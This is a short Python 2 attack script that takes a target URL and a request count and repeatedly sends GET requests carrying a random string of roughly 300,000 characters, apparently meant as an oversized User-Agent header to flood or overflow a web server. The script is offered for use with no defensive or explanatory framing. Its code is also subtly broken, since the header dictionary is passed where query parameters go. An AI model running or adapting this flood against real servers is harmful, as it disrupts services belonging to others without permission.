#!/usr/bin/python
import string 
import requests
from requests.auth import HTTPBasicAuth
from random import *
import sys
import os 

url=sys.argv[1]
count=sys.argv[2]
print "TARGET::",url
print "REQUESTz::",count
count=int(count)
def UAFLOW():
	global buff
	minchar=300000
	maxchar=303900
	charmap=string.ascii_letters+string.digits
	buff="".join(choice(charmap) for x in range(randint(minchar,maxchar)))	
	print len(buff)
	#return headers 

#rq=requests.get(url,auth=('admin','password')

def UAFLOOD():
   	global buff
	#print buff
	query=''
	headers={'User-Agent':buff}
	try:
		rqflood=requests.get(url,headers)
		print "SENDING"	
	except:
		print "HTTP ERROR"	
		

def MAIN():
	global count
	UAFLOW()
	print "CRAFTING"
	while count>0:
		
		UAFLOOD()
			
		count=count-1

MAIN()
	
